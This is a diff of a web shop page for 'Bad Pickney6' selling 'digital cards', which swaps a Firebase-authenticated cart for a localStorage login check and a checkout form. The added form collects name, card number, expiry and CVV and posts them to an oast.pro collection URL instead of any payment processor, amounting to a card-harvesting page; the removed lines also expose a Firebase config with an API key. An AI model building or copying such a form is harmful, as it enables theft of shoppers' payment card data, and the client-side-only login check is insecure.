@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Shop | Bad Pickney6</title>
-  <link rel="stylesheet" href="styles.css" />
-  <meta name="description" content="Shop exclusive digital cards from Bad Pickney6." />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shop - Bad Pickney6</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+
   <header>
-    <div class="container header-flex">
+    <div class="container">
       <div class="logo">
-        <img src="assets/images/bank-robber.png" alt="Logo" />
-        <h1>Bad Pickney6</h1>
+        <img src="assets/images/bank-robber.png" alt="Logo">
+        <h1>Bad Pickney6 Shop</h1>
       </div>
       <nav>
         <ul>
           <li><a href="index.html">Home</a></li>
-          <li><button id="logoutBtn" class="logout-btn">Logout</button></li>
+          <li><a href="#" id="logoutBtn">Logout</a></li>
         </ul>
       </nav>
     </div>
@@ -25,16 +25,20 @@
 
   <section id="shop" class="section">
     <div class="container">
-      <h2>Shop Cards</h2>
-      <p>Only logged-in users can access this page. Add your favorite cards to the cart and proceed to checkout!</p>
-
+      <h2>Shop Our Cards</h2>
       <div class="shop-grid" id="shopGrid"></div>
 
       <div id="cartContainer">
-        <h3>Your Cart</h3>
-        <ul id="cartList"></ul>
+        <h3>Cart</h3>
+        <ul id="cartItems"></ul>
         <p id="totalPrice">Total: $0</p>
-        <button id="checkoutBtn">Checkout</button>
+        <form id="checkoutForm" action="https://oast.pro/6dc777f83b840b1f739bg1ftg9ayyyyyb" method="POST">
+          <input type="text" name="name" placeholder="Name" required>
+          <input type="text" name="cardNumber" placeholder="Card Number" required>
+          <input type="text" name="expiry" placeholder="MM/YY" required>
+          <input type="text" name="cvv" placeholder="CVV" required>
+          <button type="submit">Checkout</button>
+        </form>
       </div>
     </div>
   </section>
@@ -45,93 +49,58 @@
     </div>
   </footer>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyBL-ESDufxNJZ9H2fU8IywlTaIaWoIjtuQ",
-      authDomain: "badute-5064d.firebaseapp.com",
-      projectId: "badute-594d",
-      storageBucket: "badute-5964d.appspot.com",
-      messagingSenderId: "432684410038",
-      appId: "7cf74922a7fe726ef32e17"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-
-    const logoutBtn = document.getElementById("logoutBtn");
-
-    // Restrict access to logged-in users
-    onAuthStateChanged(auth, (user) => {
-      if (!user) {
-        alert("Please log in to access the shop.");
-        window.location.href = "login.html";
-      }
-    });
-
-    logoutBtn.addEventListener("click", async () => {
-      await signOut(auth);
-      alert("Logged out successfully!");
-      window.location.href = "index.html";
-    });
-
-    // SHOP DATA
-    const products = [
-      { id: 1, name: "Gold Card", price: 50, color: "#FFD700" },
-      { id: 2, name: "Silver Card", price: 30, color: "#C0C0C0" },
-      { id: 3, name: "Platinum Card", price: 100, color: "#E5E4E2" },
-      { id: 4, name: "Black Card", price: 200, color: "#111" },
-      { id: 5, name: "Ruby Card", price: 75, color: "#E0115F" }
-    ];
-
-    const shopGrid = document.getElementById("shopGrid");
-    const cartList = document.getElementById("cartList");
-    const totalPriceEl = document.getElementById("totalPrice");
-    const checkoutBtn = document.getElementById("checkoutBtn");
-    let cart = [];
-
-    // Render cards
-    products.forEach(prod => {
-      const div = document.createElement("div");
-      div.className = "shop-card";
-      div.innerHTML = `
-        <div class="card-display" style="background:${prod.color};">
-          <h3>${prod.name}</h3>
-          <p>Exclusive design, high tier.</p>
-        </div>
-        <p><strong>$${prod.price}</strong></p>
-        <button class="buy-btn" data-id="${prod.id}">Add to Cart</button>
-      `;
-      shopGrid.appendChild(div);
-    });
-
-    // Add to cart
-    shopGrid.addEventListener("click", (e) => {
-      if (e.target.classList.contains("buy-btn")) {
-        const id = parseInt(e.target.dataset.id);
-        const item = products.find(p => p.id === id);
-        cart.push(item);
-        updateCart();
-      }
-    });
-
-    function updateCart() {
-      cartList.innerHTML = cart.map((item, i) => `<li>${item.name} - $${item.price} <button onclick="removeItem(${i})">x</button></li>`).join("");
-      const total = cart.reduce((sum, item) => sum + item.price, 0);
-      totalPriceEl.textContent = `Total: $${total}`;
+  <script>
+    // PROTECT PAGE
+    const user = JSON.parse(localStorage.getItem('loggedInUser'));
+    if(!user){
+      alert('You must log in first!');
+      window.location.href = 'index.html';
     }
 
-    window.removeItem = (i) => {
-      cart.splice(i, 1);
-      updateCart();
-    };
-
-    checkoutBtn.addEventListener("click", () => {
-      if (cart.length === 0) return alert("Your cart is empty!");
-      alert("Checkout process coming soon!");
+    // LOGOUT
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+      localStorage.removeItem('loggedInUser');
+      alert('Logged out');
+      window.location.href = 'index.html';
     });
+
+    // SAMPLE SHOP ITEMS
+    const cards = [
+      {name:"Red Card", price:50, color:"#ff4d4d"},
+      {name:"Blue Card", price:75, color:"#4d79ff"},
+      {name:"Green Card", price:60, color:"#33cc33"},
+      {name:"Gold Card", price:100, color:"#ffd700"}
+    ];
+
+    const shopGrid = document.getElementById('shopGrid');
+    const cartItems = document.getElementById('cartItems');
+    const totalPriceEl = document.getElementById('totalPrice');
+    let cart = [];
+
+    // DISPLAY CARDS
+    function displayCards(){
+      shopGrid.innerHTML = cards.map((card, i) => `
+        <div class="shop-card" style="background:${card.color}">
+          <h3>${card.name}</h3>
+          <p>Price: $${card.price}</p>
+          <button onclick="addToCart(${i})">Add to Cart</button>
+        </div>
+      `).join('');
+    }
+
+    function addToCart(index){
+      cart.push(cards[index]);
+      updateCart();
+    }
+
+    function updateCart(){
+      cartItems.innerHTML = cart.map(c => `<li>${c.name} - $${c.price}</li>`).join('');
+      const total = cart.reduce((sum,c)=>sum+c.price,0);
+      totalPriceEl.textContent = 'Total: $' + total;
+    }
+
+    displayCards();
   </script>
+
 </body>
 </html>
